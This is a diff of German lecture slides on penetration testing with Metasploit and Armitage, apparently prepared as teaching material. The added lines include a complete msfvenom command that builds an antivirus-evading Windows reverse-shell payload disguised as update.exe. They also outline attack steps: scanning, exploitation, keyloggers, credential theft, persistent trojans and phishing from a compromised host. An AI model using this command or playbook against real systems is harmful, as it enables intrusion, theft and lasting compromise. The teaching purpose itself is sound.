@@ -339,99 +339,117 @@ background-image:
 ## .center[Toolbeschreibung]
 
 - Information Gathering
-          Port Scanning
-          Service Identification
-          Password Sniffing
-          SNMP sweeping
+    - Port Scanning
+    - Service Identification
+    - Password Sniffing
+    - SNMP sweeping
+
+
 - Vulnerability Scanning with Metasploit (auxiliary/scanner/)
-          smb_login -> Filesystem Zugriff bei Windows
-          VNC Scanner -> Dienstscanner
-          WMAP Web Scanner -> Portscanner
-          NeXpose -> Vulnerability Management / Analyse Tool
-          Nessus -> Portscanner / Dictionary Attack
+    - smb_login -> Filesystem Zugriff bei Windows
+    - VNC Scanner -> Dienstscanner
+    - WMAP Web Scanner -> Portscanner
+    - NeXpose -> Vulnerability Management / Analyse Tool
+    - Nessus -> Portscanner / Dictionary Attack
 ---
 ## .center[Toolbeschreibung]
-- Exploit Development Payloads
-          MSFvenom: Custom Payload Erstellung
+  - MSFvenom: Custom Payload Erstellung zur AV Evasion
+    - reverse_tcp
+    - LHOST und LPORT angeben
+    - Filetyp -f
+    - Platform Windows
+    - Architektur x86
+    - Encoder -e x86/shikata_ga_nai
+    - Iterationen 10
+    - ">" Ausgabepfad
+
+```cli
+msfvenom --payload windows/meterpreter/reverse_tcp
+LHOST=192.168.56.102 LPORT=8080 -f exe --platform windows --arch x86
+-e x86/shikata_ga_nai -i 10 > /var/www/html/update.exe
+```
 - Using Exploits
-          use <exploit>
-            show targets
-            show payloads
-            show options
-            show evasion
-          set payload, Hosts, Ports
-          exploit -> to start service
+    - use exploit/*
+    - show targets, payloads, options
+    - set payload, Hosts, Ports, Username, Userpassword
+    - exploit -> to start service
 
 ---
-## .center[Toolbeschreibung - Armitage]
-
-  <img src="pictures/armitage_overview_portscan.png" height="85%" width="85%">
+## .center[Toolbeschreibung - Armitage - Portscan]
+  .center[<img src="pictures/armitage_overview_portscan.png" height="85%" width="85%">]
 ---
-## .center[Toolbeschreibung - Armitage]
-
-  <img src="pictures/armitage_psexec_login.png" height="85%" width="85%">
+## .center[Toolbeschreibung - Armitage - Login mit PsExec]
+  .center[<img src="pictures/armitage_psexec_login.png" height="85%" width="85%">]
 ---
-## .center[Toolbeschreibung - Armitage]
-
-  <img src="pictures/armitage_psexec_exploit.png" height="85%" width="85%">
+## .center[Toolbeschreibung - Armitage - Exploit ausführen]
+  .center[<img src="pictures/armitage_psexec_exploit.png" height="85%" width="85%">]
 ---
-## .center[Toolbeschreibung - Armitage]
-  <img src="pictures/armitage_psexec_hashdump.png" height="85%" width="85%">
+## .center[Toolbeschreibung - Armitage - Hashdump der User]
+  .center[<img src="pictures/armitage_psexec_hashdump.png" height="85%" width="85%">]
 ---
 ## .center[Ausnutzbare Schwachstellen mit metasploit]
-+ Web-Server
-    GlassFish
-    Apache Tomcat
-    Wordpress
-    PHPMyAdmin
-    Ruby on Rails
-+ Software
-    Jenkins
-    ManageEngine
-    Elasticsearch
-    MySQL
-    JMX
-+ Betriebssystem Dienste & Anwendungen
-    Internet Information Service
-    PsExec
-    SSH
-    WinRM
-    WebDAV
-    SNMP
-    RDP
+- Betriebssysteme
+    - Linux
+    - OSX
+    - Android
+    - Windows
+- Web-Server
+    - GlassFish
+    - Apache Tomcat
+    - Wordpress
+    - PHPMyAdmin
+    - Ruby on Rails
+- Software
+    - Jenkins
+    - MySQL
+- Betriebssystem Dienste & Anwendungen
+    - Internet Information Service / IIS
+    - PsExec
+    - SSH
+    - SNMP
+    - RDP
 ---
 
-## .center[Angriffsbeschreibung]
+## .center[Angriffsbeschreibung - msfconsole]
 
-  Angriff über msfconsole -> Demo
-    1. ARP Sweep zum finden von Zielen
-    2. Port Scanning zum finden Offener Ports
-    3. Exploit laden
-    4. Exploit konfigurieren
-    5. Exploit ausführen
-    6. Angriff mit Meterpreter fortführen
-    7. Z.B. Upload Payload im Autostart Verzeichnis
+### Angriff mit msfconsole wird Vorgeführt
+
+  1. ARP Sweep zum finden von Zielen
+    - Link Layer: Address Resolution Protocol
+  2. Port Scanning zum finden Offener Ports
+    - Transport Layer: TCP/UDP
+  3. Exploit laden
+    - Exploit passend zum offenen Port+Service
+  4. Exploit mit set konfigurieren und ausführen
+    - set RHOST, RPORT
+    - reverse TCP: set LHOST, LPORT
+  5. Angriff mit Meterpreter fortführen
+    - Z.B. Upload Payload im Autostart Verzeichnis
+    - Keylogger ausführen
+    - Zugangsdaten auslesen
 
 ---
-## .center[Angriffsbeschreibung]
-  Angriff mit Armitage -> Demo
-    1. NMAP Scan mit IP Range um Ziele zu finden
-    2. NMAP Quick-Portscan mit Ziel IP
-        Zielhost OS ermitteln
-        Offene Ports inklusive Dienst ermitteln
-    3. Find Attacks zum ermitteln möglicher Exploits
-    4. Optional: Check Exploits
-        Wenige Module unterstützen diese Funktion
-    5. Brute Force / Social Engineer / Fish Login Details
-      Benötigt nicht bei jedem Exploit Adminrechte
-    6. Login, exploit und Loot sammeln
-        Wenn möglich eigene Berechtigungen erhöhen
-        Mit Skripten nach wertvollen Informationen suchen, z.B. BTC-Wallets
-        Keylogger installieren
-        Persistenten Trojaner installieren
-    7. Angriff erweitern
-        Mit dem Loot versuchen weitere Schwachstellen zu identifizeren
 
+## .center[Angriffsbeschreibung - Armitage]
+
+### Angriff mit Armitage wird Vorgeführt
+
+  1. NMAP Scan
+    - IP Range auf 192.168.56.0/24 um Ziele zu finden
+  2. NMAP Quick-Scan mit Ziel IP
+    - Zielhost OS ermitteln
+    - Offene Ports inklusive Dienst ermitteln
+  3. Find Attacks um Auswahl der Exploits einzuschränken
+  4. Brute Force / Social Engineering / Fishing der Login Details
+    - nicht jeder Exploit benötigt Adminrechte
+  5. Login, exploit und Loot sammeln
+    - Wenn möglich eigene Berechtigungen erhöhen
+    - Keylogger installieren
+    - Persistenten Trojaner installieren
+  6. Angriff erweitern
+    - Mit dem Loot weitere Schwachstellen identifizeren
+    - Fishing Mail vom Ziel aus verschicken
+    - Payloads auf WebServer verstecken
 ---
 
 ## .center[Vorführung]
